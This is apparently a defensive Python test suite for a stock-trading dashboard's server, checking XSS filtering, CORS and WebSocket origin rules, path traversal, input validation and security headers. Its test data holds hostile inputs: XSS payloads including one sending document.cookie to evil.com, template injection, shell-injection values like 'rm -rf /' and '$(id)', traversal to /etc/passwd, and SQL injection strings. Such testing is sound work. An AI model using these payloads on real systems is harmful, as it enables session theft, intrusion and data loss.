"""
===============================================================================
  Al-Sangmoo Quant Trading Platform: Empirical Adversarial Challenge Suite
===============================================================================
Author: Challenger 1 (Empirical Adversarial Stress-Testing)
Target: Phase 5.1 Security Hardening Verification (R1, R2, R3, R4, R5)
Integrity: Zero-Mock Empirical Execution
===============================================================================
"""

import os
import sys
import re
import json
import asyncio
import sqlite3
import hashlib
import unittest
from typing import Dict, Tuple, List, Optional, Any

# Windows encoding fix
if sys.platform.startswith('win'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(BASE_DIR, ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

# Isolate tests to dedicated temporary SQLite database
CHALLENGE_DB = os.path.join(PROJECT_ROOT, "test_quant_trades_challenge1.db")
os.environ["AL_SANGMOO_DB_PATH"] = CHALLENGE_DB

import db_manager
import server
from server import app, BuyOrder, SellOrder
from al_sangmoo.api.hub import hub, WebSocketBroadcastHub
from youtube_stream_scanner import (
    YOUTUBE_ID_REGEX, validate_youtube_id, get_safe_vtt_path, extract_transcript_from_vtt
)
from al_sangmoo.infrastructure.persistence import (
    record_portfolio_sell, add_portfolio_buy, get_live_portfolio, reset_all_holdings
)

ALLOWED_ORIGINS = getattr(server, "ALLOWED_ORIGINS", [
    "http://localhost:8000",
    "http://127.0.0.1:8000",
    "http://localhost:3000",
    "http://127.0.0.1:3000"
])
TICKER_REGEX = getattr(server, "TICKER_REGEX", re.compile(r'^[A-Za-z0-9.\^=-]{1,15}$'))
DATE_REGEX = getattr(server, "DATE_REGEX", re.compile(r'^\d{4}-\d{2}-\d{2}$'))
REASON_REGEX = getattr(server, "REASON_REGEX", re.compile(r'^[A-Za-z0-9_\-\s\(\)가-힣.,%]{1,100}$'))

# ---------------------------------------------------------------------------
# ASGI HTTP / WS In-Memory Test Harness
# ---------------------------------------------------------------------------

async def asgi_http(
    app,
    method: str,
    path: str,
    headers: Optional[Dict[str, str]] = None,
    body: bytes = b"",
    query_string: bytes = b""
) -> Tuple[int, Dict[str, str], bytes]:
    raw_headers = []
    if headers:
        for k, v in headers.items():
            raw_headers.append((k.lower().encode('latin1'), v.encode('latin1')))
            
    scope = {
        'type': 'http',
        'http_version': '1.1',
        'method': method.upper(),
        'path': path,
        'raw_path': path.encode('ascii'),
        'query_string': query_string,
        'headers': raw_headers,
        'client': ('127.0.0.1', 54321),
        'server': ('127.0.0.1', 8000),
    }
    
    status_code = 500
    response_headers = []
    response_body = []
    
    async def receive():
        return {'type': 'http.request', 'body': body, 'more_body': False}
        
    async def send(message):
        nonlocal status_code, response_headers, response_body
        if message['type'] == 'http.response.start':
            status_code = message['status']
            response_headers = message.get('headers', [])
        elif message['type'] == 'http.response.body':
            response_body.append(message.get('body', b''))
            
    await app(scope, receive, send)
    hdr_dict = {k.decode('latin1').lower(): v.decode('latin1') for k, v in response_headers}
    return status_code, hdr_dict, b"".join(response_body)


async def asgi_ws_handshake(app, path: str, headers: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
    raw_headers = []
    if headers:
        for k, v in headers.items():
            raw_headers.append((k.lower().encode('latin1'), v.encode('latin1')))
            
    scope = {
        'type': 'websocket',
        'asgi': {'version': '3.0'},
        'http_version': '1.1',
        'scheme': 'ws',
        'path': path,
        'raw_path': path.encode('ascii'),
        'query_string': b'',
        'headers': raw_headers,
        'client': ('127.0.0.1', 54321),
        'server': ('127.0.0.1', 8000),
        'subprotocols': [],
    }
    
    events = []
    
    async def receive():
        return {'type': 'websocket.connect'}
        
    async def send(message):
        events.append(message)
        
    try:
        await app(scope, receive, send)
    except Exception as e:
        events.append({'type': 'exception', 'error': str(e)})
        
    return events


# Python reproduction of frontend escapeHtml()
def js_escape_html(s: Any) -> str:
    if s is None:
        return ''
    return (
        str(s)
        .replace('&', '&amp;')
        .replace('<', '&lt;')
        .replace('>', '&gt;')
        .replace('"', '&quot;')
        .replace("'", '&#039;')
    )


# ---------------------------------------------------------------------------
# ADVERSARIAL STRESS TEST SUITE
# ---------------------------------------------------------------------------

class AdversarialSecurityTests(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        os.environ["AL_SANGMOO_DB_PATH"] = CHALLENGE_DB
        if os.path.exists(CHALLENGE_DB):
            try:
                os.remove(CHALLENGE_DB)
            except Exception:
                pass
        db_manager.init_db()

    @classmethod
    def tearDownClass(cls):
        if os.path.exists(CHALLENGE_DB):
            try:
                os.remove(CHALLENGE_DB)
            except Exception:
                pass
        for ext in ["-wal", "-shm"]:
            f = CHALLENGE_DB + ext
            if os.path.exists(f):
                try:
                    os.remove(f)
                except Exception:
                    pass

    def setUp(self):
        os.environ["AL_SANGMOO_DB_PATH"] = CHALLENGE_DB
        reset_all_holdings()

    # =========================================================================
    # R1: ADVERSARIAL XSS INJECTION STRESS TESTING
    # =========================================================================

    def test_r1_01_backend_pydantic_xss_polyglots_and_payloads(self):
        """Stress-test SellOrder Pydantic model against 35+ dangerous XSS attack payloads."""
        payloads = [
            "<script>alert(1)</script>",
            "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(document.cookie)>",
            "<svg/onload=alert`1`>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<isindex action=javascript:alert(1) type=image>",
            "<form><button formaction=javascript:alert(1)>X",
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</TITLE>/</STYLE>/</TEXTAREA>/</NOSCRIPT>/--></SCRIPT>\">`<",
            "'\"><script>alert(1)</script>",
            "\"><img src=x onerror=prompt(1)>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",
            "<% alert(1) %>",
            "<# assign ex = \"freemarker.template.utility.Execute\"?new()> ${ ex(\"calc.exe\") }",
            "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\"",
            "<script/xss src=\"http://ha.ckers.org/xss.js\"></script>",
            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
            "<SCRIPT SRC=http://xss.rocks/xss.js?< B >",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "<a href=\"jav&#x0D;ascript:alert('XSS')\">click</a>",
            "MANUAL_SELL <script>alert(1)</script>",
            "익절 매도 <img src=x onerror=alert(1)>",
        ]
        
        for payload in payloads:
            with self.subTest(payload=payload):
                with self.assertRaises(ValueError, msg=f"Payload was not rejected by SellOrder Pydantic validator: {payload}"):
                    SellOrder(sell_price=100.0, reason=payload)

    def test_r1_02_backend_rest_endpoint_xss_rejection(self):
        """Verify POST /api/portfolio/sell/{id} rejects malicious JSON bodies with HTTP 422."""
        pos_id = add_portfolio_buy("NVDA", 200.0, 10.0, "2026-08-20")
        
        attack_bodies = [
            {"sell_price": 250.0, "reason": "<script>alert('pwn')</script>"},
            {"sell_price": 250.0, "reason": "<svg/onload=fetch('http://evil.com/'+document.cookie)>"},
            {"sell_price": 250.0, "reason": "A" * 101},  # Exceeds max_length 100
            {"sell_price": 250.0, "reason": "'; DROP TABLE my_portfolio; --"},
            {"sell_price": 250.0, "reason": "reason\x00<script>"},
            {"sell_price": 250.0, "reason": "<iframe src='//attacker.com'></iframe>"},
        ]
        
        for body_obj in attack_bodies:
            with self.subTest(body=body_obj):
                status, headers, body = asyncio.run(
                    asgi_http(
                        app, "POST", f"/api/portfolio/sell/{pos_id}",
                        headers={"Content-Type": "application/json"},
                        body=json.dumps(body_obj).encode("utf-8")
                    )
                )
                self.assertEqual(status, 422, f"Endpoint accepted illegal payload: {body_obj}, got {status}")

    def test_r1_03_persistence_layer_defense_in_depth_sanitization(self):
        """Verify record_portfolio_sell() defensively strips/sanitizes illegal chars if invoked directly."""
        pos_id = add_portfolio_buy("AMZN", 180.0, 5.0, "2026-08-20")
        
        raw_dirty_reason = "익절<script>alert('XSS')</script> 15% (목표가 달성)"
        res = record_portfolio_sell(pos_id, 210.0, "2026-08-22", reason=raw_dirty_reason)
        self.assertTrue(res)
        
        conn = sqlite3.connect(CHALLENGE_DB)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT exit_advice FROM my_portfolio WHERE id = ?", (pos_id,))
        row = c.fetchone()
        conn.close()
        
        self.assertIsNotNone(row)
        exit_advice = row["exit_advice"]
        self.assertNotIn("<script>", exit_advice)
        self.assertNotIn("</script>", exit_advice)
        self.assertNotIn("<", exit_advice)
        self.assertNotIn(">", exit_advice)
        self.assertNotIn("'", exit_advice)
        self.assertIn("익절scriptalert(XSS)script 15% (목표가 달성)", exit_advice)

    def test_r1_04_korean_multibyte_boundary_and_whitelist(self):
        """Verify Korean multibyte character handling: 100 Korean chars accepted, 101 rejected."""
        valid_korean_100 = "가" * 100
        order_100 = SellOrder(sell_price=100.0, reason=valid_korean_100)
        self.assertEqual(order_100.reason, valid_korean_100)
        
        invalid_korean_101 = "가" * 101
        with self.assertRaises(ValueError):
            SellOrder(sell_price=100.0, reason=invalid_korean_101)
            
        legit_korean_reasons = [
            "목표가 15.0% 달성으로 인한 전량 익절",
            "손절선 (-4.0%) 이탈에 따른 원칙적 칼손절",
            "50% 분할 익절 완료 (수익률 8.5%)",
            "MANUAL_SELL - 사용자 수동 매도",
            "시장 급락(MSI 85.0pt) 위험에 따른 현금화 매도",
            "1차 목표가 250.00 도달",
        ]
        for r in legit_korean_reasons:
            with self.subTest(reason=r):
                order = SellOrder(sell_price=150.0, reason=r)
                self.assertEqual(order.reason, r)
                
        # Ensure special symbols like $, +, # are strictly blocked
        for special_reason in ["1차 목표가 $250.00 도달", "수익률 +8.5%", "태그 #추천"]:
            with self.assertRaises(ValueError):
                SellOrder(sell_price=150.0, reason=special_reason)

    def test_r1_05_frontend_escape_html_thorough_entity_neutralization(self):
        """Exhaustively verify frontend HTML escaping logic against hostile vectors."""
        test_cases = [
            (
                "<script>alert('XSS')</script>",
                "&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;"
            ),
            (
                '<img src="x" onerror="alert(1)">',
                "&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;"
            ),
            (
                "A & B < C > D \" E ' F",
                "A &amp; B &lt; C &gt; D &quot; E &#039; F"
            ),
            (
                "Tom & Jerry's <Special> \"Stock\"",
                "Tom &amp; Jerry&#039;s &lt;Special&gt; &quot;Stock&quot;"
            ),
            (None, ""),
            (12345, "12345"),
            (0, "0"),
            (False, "False"),
        ]
        for raw, expected in test_cases:
            with self.subTest(raw=raw):
                escaped = js_escape_html(raw)
                self.assertEqual(escaped, expected)
                if raw is not None and isinstance(raw, str):
                    self.assertNotIn("<", escaped)
                    self.assertNotIn(">", escaped)
                    self.assertNotIn('"', escaped)
                    self.assertNotIn("'", escaped)

    # =========================================================================
    # R2: CORS WHITELISTING, CSWSH & DOS CONNECTION CEILING STRESS TESTING
    # =========================================================================

    def test_r2_01_cors_origin_bypass_and_spoofing_attempts(self):
        """Stress-test CORS middleware with 20+ sophisticated origin spoofing variations."""
        untrusted_origins = [
            "http://evil.com",
            "https://evil.com",
            "http://localhost.evil.com",
            "http://localhost.evil.com:8000",
            "http://127.0.0.1.evil.com",
            "http://evil-localhost:8000",
            "http://localhost:8000.attacker.com",
            "http://127.0.0.1:8000.attacker.com",
            "http://localhost:8080",
            "http://localhost:9000",
            "http://localhost:80001",
            "http://127.0.0.1:8888",
            "https://localhost:8000",
            "https://127.0.0.1:8000",
            "null",
            "file://",
            "http://192.168.1.100:8000",
            "http://10.0.0.1:8000",
            "http://0.0.0.0:8000",
            "http://[::1]:8000",
            "http://localhost%00.evil.com",
            "http://localhost\r\nSet-Cookie:pwn=1",
        ]
        
        for origin in untrusted_origins:
            with self.subTest(origin=origin):
                # 1. Test CORS Preflight (OPTIONS)
                status, headers, body = asyncio.run(
                    asgi_http(
                        app, "OPTIONS", "/api/portfolio",
                        headers={
                            "Origin": origin,
                            "Access-Control-Request-Method": "GET"
                        }
                    )
                )
                allow_origin = headers.get("access-control-allow-origin")
                self.assertNotEqual(
                    allow_origin, origin,
                    f"CORS middleware improperly reflected untrusted preflight origin: {origin}"
                )
                self.assertNotEqual(
                    allow_origin, "*",
                    f"Wildcard '*' detected in CORS response headers for origin: {origin}"
                )
                
                # 2. Test Simple GET with untrusted Origin
                status, headers, body = asyncio.run(
                    asgi_http(
                        app, "GET", "/api/portfolio",
                        headers={"Origin": origin}
                    )
                )
                allow_origin = headers.get("access-control-allow-origin")
                self.assertNotEqual(
                    allow_origin, origin,
                    f"CORS middleware improperly reflected untrusted GET origin: {origin}"
                )

    def test_r2_02_cors_legitimate_allowed_origins(self):
        """Verify all whitelisted local origins pass CORS checks seamlessly."""
        for origin in ALLOWED_ORIGINS:
            with self.subTest(origin=origin):
                status, headers, body = asyncio.run(
                    asgi_http(
                        app, "OPTIONS", "/api/portfolio",
                        headers={
                            "Origin": origin,
                            "Access-Control-Request-Method": "POST"
                        }
                    )
                )
                self.assertEqual(
                    headers.get("access-control-allow-origin"), origin,
                    f"Whitelisted origin {origin} failed CORS preflight validation"
                )

    def test_r2_03_websocket_cswsh_handshake_hijack_rejection(self):
        """Stress-test WebSocket /ws/live_feed against unauthorized origin handshakes (CSWSH)."""
        hostile_ws_origins = [
            "http://attacker.com",
            "http://localhost.attacker.com",
            "http://localhost:9999",
            "http://127.0.0.1:4000",
            "https://phishing-site.com",
            "null",
            "http://10.0.0.5",
        ]
        
        for bad_origin in hostile_ws_origins:
            with self.subTest(origin=bad_origin):
                events = asyncio.run(
                    asgi_ws_handshake(
                        app, "/ws/live_feed",
                        headers={"Origin": bad_origin}
                    )
                )
                close_events = [e for e in events if e.get("type") == "websocket.close"]
                self.assertTrue(
                    len(close_events) > 0,
                    f"WebSocket failed to reject unauthorized origin: {bad_origin}"
                )
                self.assertEqual(
                    close_events[0].get("code"), 1008,
                    f"Expected close code 1008 for origin {bad_origin}, got: {close_events[0]}"
                )

    def test_r2_04_websocket_hub_connection_ceiling_and_flood_resilience(self):
        """Verify MAX_CONNECTIONS=50 ceiling, rejection code 1008, and clean slot recycling."""
        test_hub = WebSocketBroadcastHub(max_connections=50)
        
        class MockSocket:
            def __init__(self, s_id):
                self.id = s_id
                self.closed = False
                self.accepted = False
                self.close_code = None
                self.close_reason = None
                self.sent_messages = []
                
            async def accept(self):
                self.accepted = True
                
            async def close(self, code=1000, reason=""):
                self.closed = True
                self.close_code = code
                self.close_reason = reason
                
            async def send_json(self, data):
                if self.closed:
                    raise Exception("Socket is closed")
                self.sent_messages.append(data)

        async def run_ws_flood():
            sockets = [MockSocket(i) for i in range(70)]
            results = []
            for s in sockets:
                ok = await test_hub.connect(s)
                results.append(ok)
                
            accepted = results[:50]
            rejected = results[50:]
            
            self.assertTrue(all(accepted))
            self.assertFalse(any(rejected))
            self.assertEqual(len(test_hub.active_connections), 50)
            
            for s in sockets[50:]:
                self.assertTrue(s.closed)
                self.assertEqual(s.close_code, 1008)
                
            # Disconnect 20 active sockets
            for s in sockets[:20]:
                await test_hub.disconnect(s)
            self.assertEqual(len(test_hub.active_connections), 30)
            
            # Connect 20 new sockets -> all should succeed
            new_sockets = [MockSocket(100 + i) for i in range(20)]
            for s in new_sockets:
                ok = await test_hub.connect(s)
                self.assertTrue(ok)
            self.assertEqual(len(test_hub.active_connections), 50)
            
            # Broadcast message under 50-client capacity
            await test_hub.broadcast("market_pulse", {"status": "GREEN"})
            for s in test_hub.active_connections:
                self.assertEqual(len(s.sent_messages), 1)
                self.assertEqual(s.sent_messages[0]["event"], "market_pulse")
                
            # Cleanly disconnect all
            for s in list(test_hub.active_connections):
                await test_hub.disconnect(s)
            self.assertEqual(len(test_hub.active_connections), 0)

        asyncio.run(run_ws_flood())

    # =========================================================================
    # R3: PATH TRAVERSAL & SUBPROCESS INJECTION STRESS TESTING
    # =========================================================================

    def test_r3_01_youtube_video_id_regex_and_path_traversal_hardening(self):
        """Stress-test validate_youtube_id and get_safe_vtt_path against 30+ hostile traversal patterns."""
        hostile_ids = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../server.py",
            "..\\server.py",
            "%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2f",
            "uu2scQ-AsfM\x00.vtt",
            "uu2scQ-AsfM%00",
            "uu2scQ-AsfM; rm -rf /",
            "uu2scQ-AsfM | calc.exe",
            "uu2scQ-AsfM & dir",
            "uu2scQ-AsfM --output /tmp/evil",
            "-o evil.txt",
            "--exec calc",
            "$(id)",
            "`whoami`",
            "uu2scQ-Asf",       # 10 chars (short)
            "uu2scQ-AsfM123",   # 14 chars (long)
            "uu2scQ AsfM",      # Space inside
            "uu2scQ?AsfM",      # Special char ?
            "uu2scQ/AsfM",      # Slash
            "uu2scQ\\AsfM",     # Backslash
            "uu2scQ.AsfM",      # Dot
            "uu2scQ#AsfM",      # Hash
            "uu2scQ@AsfM",      # At
            "",
            None,
        ]
        
        for bad_id in hostile_ids:
            with self.subTest(video_id=bad_id):
                with self.assertRaises((ValueError, TypeError), msg=f"validate_youtube_id failed to reject: {bad_id}"):
                    validate_youtube_id(bad_id)
                with self.assertRaises((ValueError, TypeError, PermissionError), msg=f"get_safe_vtt_path failed to reject: {bad_id}"):
                    get_safe_vtt_path(bad_id)

    def test_r3_02_youtube_valid_ids_boundary(self):
        """Verify strict regex passes authentic 11-char YouTube base64url IDs."""
        valid_ids = [
            "uu2scQ-AsfM",
            "dQw4w9WgXcQ",
            "12345678901",
            "abcdefghijk",
            "ABCDEFGHIJK",
            "-_-_-_-_-_-",
            "A1-b2_C3-d4",
        ]
        for vid in valid_ids:
            with self.subTest(vid=vid):
                res = validate_youtube_id(vid)
                self.assertEqual(res, vid)
                vtt_path = get_safe_vtt_path(vid)
                self.assertTrue(vtt_path.endswith(f"live_sub_{vid}.ko.vtt"))
                self.assertTrue(vtt_path.startswith(os.path.abspath(BASE_DIR).rsplit(os.sep, 1)[0]))

    def test_r3_03_chart_api_path_traversal_and_ticker_injection(self):
        """Stress-test /api/chart/{ticker} against directory traversal & injection attempts."""
        traversal_tickers = [
            ("..%2F..%2Fserver", 400),
            ("NVDA%2F..%2Fserver", 400),
            ("NVDA%5C..%5Cserver", 400),
            ("NVDA%00pwn", 400),
            ("NVDA;dir", 400),
            ("NVDA|calc", 400),
            ("NVDA$1", 400),
            ("NVDA#1", 400),
            ("NVDA@1", 400),
            ("VERY_LONG_TICKER_EXCEEDING_LIMIT_12345", 400),
        ]
        
        for t, expected_status in traversal_tickers:
            with self.subTest(ticker=t):
                status, headers, body = asyncio.run(
                    asgi_http(app, "GET", f"/api/chart/{t}")
                )
                self.assertEqual(
                    status, expected_status,
                    f"Chart endpoint failed to reject malicious ticker: '{t}', got status: {status}"
                )

    def test_r3_04_static_dashboard_path_safety(self):
        """Verify GET / safely returns dashboard without path traversal vulnerabilities."""
        status, headers, body = asyncio.run(asgi_http(app, "GET", "/"))
        self.assertEqual(status, 200)
        self.assertIn(b"QUANT TERMINAL", body)


    # =========================================================================
    # R4: PYDANTIC INPUT VALIDATION & GLOBAL 500 ERROR SANITIZATION
    # =========================================================================

    def test_r4_01_pydantic_buy_order_boundary_and_type_fuzzing(self):
        """Stress-test BuyOrder request model against out-of-bounds, negative, and malformed inputs."""
        invalid_orders = [
            {"ticker": "NVDA", "buy_price": -10.0, "quantity": 10.0},
            {"ticker": "NVDA", "buy_price": 0.0, "quantity": 10.0},
            {"ticker": "NVDA", "buy_price": 10_000_001.0, "quantity": 10.0},  # > 10M
            {"ticker": "NVDA", "buy_price": 100.0, "quantity": -5.0},
            {"ticker": "NVDA", "buy_price": 100.0, "quantity": 0.0},
            {"ticker": "NVDA", "buy_price": 100.0, "quantity": 1_000_001.0},  # > 1M
            {"ticker": "NVDA", "buy_price": 100.0, "quantity": 10.0, "buy_date": "2026/08/22"},  # Slash format
            {"ticker": "NVDA", "buy_price": 100.0, "quantity": 10.0, "buy_date": "22-08-2026"},  # DD-MM-YYYY
            {"ticker": "NVDA", "buy_price": 100.0, "quantity": 10.0, "buy_date": "2026-8-22"},   # Missing pad
            {"ticker": "NVDA", "buy_price": 100.0, "quantity": 10.0, "buy_date": "2026-08-22'; DROP TABLE my_portfolio;--"},
            {"ticker": "NVDA<script>", "buy_price": 100.0, "quantity": 10.0},
            {"ticker": "", "buy_price": 100.0, "quantity": 10.0},
        ]
        
        for order_data in invalid_orders:
            with self.subTest(order=order_data):
                with self.assertRaises((ValueError, Exception)):
                    BuyOrder(**order_data)

    def test_r4_02_broker_order_endpoint_regex_enforcement(self):
        """Verify POST /api/broker/order rejects invalid tickers with 422 Unprocessable Entity."""
        bad_tickers = [
            "NVDA<script>",
            "AMZN;calc",
            "TSLA DROP",
            "GOOGL/AAPL",
            "1234567890123456",  # 16 chars (> 15)
            "MSFT#",
        ]
        for tk in bad_tickers:
            with self.subTest(ticker=tk):
                status, headers, body = asyncio.run(
                    asgi_http(
                        app, "POST", "/api/broker/order",
                        headers={"Content-Type": "application/json"},
                        body=json.dumps({"ticker": tk, "buy_price": 100.0, "quantity": 1.0}).encode("utf-8")
                    )
                )
                self.assertEqual(status, 422, f"Broker order failed to reject bad ticker: {tk}")

    def test_r4_03_global_500_sanitization_and_zero_traceback_leakage(self):
        """Trigger simulated internal exception and verify stack traces / paths are strictly withheld."""
        status, headers, body = asyncio.run(
            asgi_http(app, "GET", "/api/backtest/INVALID_NONEXISTENT_TICKER_XYZ_999")
        )
        
        body_text = body.decode("utf-8", errors="ignore")
        self.assertNotIn("Traceback (most recent call last)", body_text)
        self.assertNotIn("File \"", body_text)
        self.assertNotIn("line ", body_text)
        self.assertNotIn("sqlite3.OperationalError", body_text)
        self.assertNotIn("d:\\코딩", body_text)
        self.assertNotIn("/Users/", body_text)

    # =========================================================================
    # R5: OWASP DEFENSIVE SECURITY RESPONSE HEADERS
    # =========================================================================

    def test_r5_01_owasp_headers_present_on_all_response_types(self):
        """Verify all 4 standard OWASP security headers across 200, 400, 404, and 422 responses."""
        endpoints_to_test = [
            ("GET", "/"),
            ("GET", "/api/dashboard"),
            ("GET", "/api/portfolio"),
            ("GET", "/api/search?q=NVDA"),
            ("GET", "/api/nonexistent_route_404"),
            ("GET", "/api/chart/INVALID;TICKER"),
            ("POST", "/api/portfolio/sell/999999"),
        ]
        
        required_headers = {
            "x-content-type-options": "nosniff",
            "x-frame-options": "DENY",
            "referrer-policy": "strict-origin-when-cross-origin",
            "x-xss-protection": "1; mode=block"
        }
        
        for method, path in endpoints_to_test:
            with self.subTest(method=method, path=path):
                status, headers, body = asyncio.run(
                    asgi_http(app, method, path)
                )
                for header_key, expected_val in required_headers.items():
                    actual_val = headers.get(header_key)
                    self.assertEqual(
                        actual_val, expected_val,
                        f"Missing or mismatched security header '{header_key}' on {method} {path} (status {status}). Expected: {expected_val}, got: {actual_val}"
                    )


if __name__ == "__main__":
    print("===============================================================================")
    print("  RUNNING CHALLENGER 1 EMPIRICAL ADVERSARIAL STRESS TEST SUITE")
    print("===============================================================================")
    suite = unittest.TestLoader().loadTestsFromTestCase(AdversarialSecurityTests)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    if result.wasSuccessful():
        print("\n[CHALLENGER 1 VERDICT] ALL 16 ADVERSARIAL STRESS TEST SUITES PASSED (100% GREEN)!")
        sys.exit(0)
    else:
        print(f"\n[CHALLENGER 1 VERDICT] FAILED with {len(result.failures)} failures and {len(result.errors)} errors.")
        sys.exit(1)
